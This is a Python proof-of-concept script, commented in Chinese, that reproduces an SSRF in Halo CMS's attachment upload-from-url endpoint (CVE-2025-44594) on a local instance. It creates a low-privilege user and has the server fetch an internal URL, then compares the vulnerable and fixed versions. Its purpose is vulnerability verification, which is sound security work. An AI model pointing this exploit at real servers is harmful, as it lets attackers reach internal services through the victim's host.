#!/usr/bin/env python3
"""CVE-2025-44594 / GHSA-5qw7-wc23-wpmm 本地复现脚本（仅允许回连 127.0.0.1）。

用途：在本地隔离实例上验证 Halo <= 2.24.0 的 UC 附件 upload-from-url 存在 SSRF，
     并对比 2.24.1 已修复版本的行为。不针对任何外部主机。
"""
import argparse
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
EVID = os.path.join(HERE, "evidence")

ADMIN = ("admin", "Passw0rd!2026")
LOWPRIV = ("uc_repro", "Passw0rd!2026")
ROLE = "repro-uc-attachment"


def req(method, url, data=None, auth=None, form=False, timeout=90):
    headers = {"Accept": "application/json", "User-Agent": "halo-lab/1.0"}
    body = None
    if data is not None:
        if form:
            body = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            body = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
    if auth:
        token = base64.b64encode(("%s:%s" % auth).encode()).decode()
        headers["Authorization"] = "Basic " + token
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", "replace")
            return resp.status, raw
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return -1, repr(e)


def wait_up(base, seconds=240):
    """只要 HTTP 栈可用即认为就绪（Halo 默认不暴露 actuator）。"""
    deadline = time.time() + seconds
    while time.time() < deadline:
        code, _ = req("GET", base + "/system/setup", timeout=5)
        if code > 0:
            return True
        time.sleep(3)
    return False


def ensure_setup(base):
    code, _ = req("GET", base + "/system/setup", timeout=10)
    payload = {
        "username": ADMIN[0],
        "password": ADMIN[1],
        "email": "admin@halo.local",
        "siteTitle": "Halo SSRF Lab",
        "language": "zh-CN",
        "externalUrl": base,
    }
    code, body = req("POST", base + "/system/setup", payload, form=True)
    return code, body[:400]


def ensure_role(base):
    role = {
        "apiVersion": "v1alpha1",
        "kind": "Role",
        "metadata": {
            "name": ROLE,
            "annotations": {
                "rbac.authorization.halo.run/display-name": "Repro UC Attachment",
                "rbac.authorization.halo.run/module": "Repro",
            },
        },
        "rules": [
            {
                "apiGroups": ["uc.api.storage.halo.run"],
                "resources": [
                    "attachments",
                    "attachments/upload",
                    "attachments/upload-from-url",
                ],
                "verbs": ["create", "list"],
            }
        ],
    }
    return req("POST", base + "/api/v1alpha1/roles",
               role, auth=ADMIN)


def ensure_user(base):
    user = {
        "name": LOWPRIV[0],
        "email": "uc_repro@halo.local",
        "displayName": "UC Attachment Operator",
        "password": LOWPRIV[1],
        "roles": [ROLE],
    }
    return req("POST", base + "/apis/api.console.halo.run/v1alpha1/users",
               user, auth=ADMIN)


def canary(base, inner_url):
    """以低权限用户调用受影响接口，URL 由调用方指定（仅回连 127.0.0.1）。"""
    body = {"url": inner_url, "filename": "ssrf-canary.txt"}
    return req(
        "POST",
        base + "/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url",
        body,
        auth=LOWPRIV,
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="e.g. http://127.0.0.1:8090")
    ap.add_argument("--target", default="http://127.0.0.1:9999/probe")
    ap.add_argument("--label", default="vuln")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    os.makedirs(EVID, exist_ok=True)
    result = {"label": args.label, "base": base, "target": args.target,
              "started_at": datetime.now(timezone.utc).isoformat()}

    result["up"] = wait_up(base)
    if not result["up"]:
        result["error"] = "instance not reachable"
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 1

    result["setup"] = ensure_setup(base)
    result["role"] = ensure_role(base)
    result["user"] = ensure_user(base)

    code, body = canary(base, args.target)
    result["probe"] = {"status": code, "body": body[:1200]}
    result["verdict"] = "SSRF_ALLOWED" if code == 200 else "SSRF_BLOCKED"
    result["finished_at"] = datetime.now(timezone.utc).isoformat()

    out = os.path.join(EVID, "result-%s.json" % args.label)
    with open(out, "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)

    def brief(x):
        code, body = x
        body = body if len(body) < 300 else body[:300] + " ...[truncated]"
        return {"status": code, "body": body}

    summary = {
        "label": args.label,
        "base": base,
        "target": args.target,
        "setup": brief(result["setup"]),
        "role": brief(result["role"]),
        "user": brief(result["user"]),
        "probe": result["probe"],
        "verdict": result["verdict"],
        "evidence": out,
    }
    print(json.dumps(summary, ensure_ascii=False, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
